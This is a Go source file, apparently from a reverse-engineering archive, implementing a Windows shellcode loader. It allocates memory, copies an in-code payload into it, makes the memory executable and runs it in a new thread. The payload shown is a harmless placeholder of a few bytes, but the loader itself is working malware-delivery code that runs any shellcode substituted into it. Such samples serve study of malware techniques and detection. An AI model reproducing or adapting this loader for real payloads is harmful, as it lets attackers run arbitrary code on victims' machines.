/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack

Compile:
    $ go build code.go

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000
	MEM_FREE    = 0x10000

	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll    = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect      = kernel32.MustFindProc("VirtualProtect")
	CreateThread        = kernel32.MustFindProc("CreateThread")
	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
)

func main() {
	// shellcode storage in stack
	var payload = []byte{
		0x90, 0x90, 0xCC, 0xC3,
	}
	var old_protect uint32

	// allocate memory buffer for payload as READ-WRITE (no executable)
	runtime, _, _ := VirtualAlloc.Call(0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	// copy payload to the buffer
	RtlMoveMemory.Call(runtime, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))

	// make buffer executable (R-X)
	VirtualProtect.Call(runtime, uintptr(len(payload)), PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&old_protect)))

	// execute
	th_shellcode, _, _ := CreateThread.Call(0, 0, runtime, 0, 0, 0)
	WaitForSingleObject.Call(th_shellcode, syscall.INFINITE)
}
